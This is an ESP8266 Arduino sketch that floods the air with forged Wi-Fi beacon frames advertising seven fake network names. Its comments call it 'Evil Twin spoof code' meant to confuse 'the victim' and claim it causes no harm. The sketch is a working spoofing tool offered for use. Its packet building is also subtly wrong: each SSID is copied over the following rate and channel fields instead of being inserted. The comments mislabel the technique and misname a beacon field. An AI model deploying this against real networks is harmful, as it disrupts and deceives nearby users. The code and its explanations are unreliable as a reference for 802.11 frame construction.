//This is not a Deauth-type :)
//This is an Evil Twin spoof code, which means it will just make multiple spoofs of the same network, confusing the victim; it does not cause actual harm.

#include <Arduino.h>
#include <ESP8266WiFi.h>
extern "C" {
#include "user_interface.h"
}

const char* ssidList[] = {
  "Fake_AP1", "Fake_AP2", "Fake_AP3",
  "Fake_AP4", "Fake_AP5", "Fake_AP6", "Fake_AP7"
};

uint8_t beaconPacket[109] = {
  0x80, 0x00, 0x00, 0x00,                          //Frame control, Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,              //Destination address
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,              //Src address (MAC)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,              //BSSID
  0x00, 0x00,                                      //Sequence control
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //Timestamp
  0xff, 0xff,                                      //Beacon interval
  0x01, 0x04,                                      //Capabilities
  0x00, 0x00,                                      //SSID paras
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,  //Supported rates
  0x03, 0x01, 0x01,                                //Channel
  0x05, 0x04, 0x00, 0x02, 0x00, 0x00               //Traffic induction maps
};

void setup() {
  Serial.begin(115200);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_channel(1);
}

void sendBeacon(const char* ssid) {
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) return;
  beaconPacket[37] = ssidLen;
  memcpy(&beaconPacket[38], ssid, ssidLen);
  wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
}

void loop() {
  for (int i = 0; i < 7; i++) {
    sendBeacon(ssidList[i]);
    delay(100);
  }
}
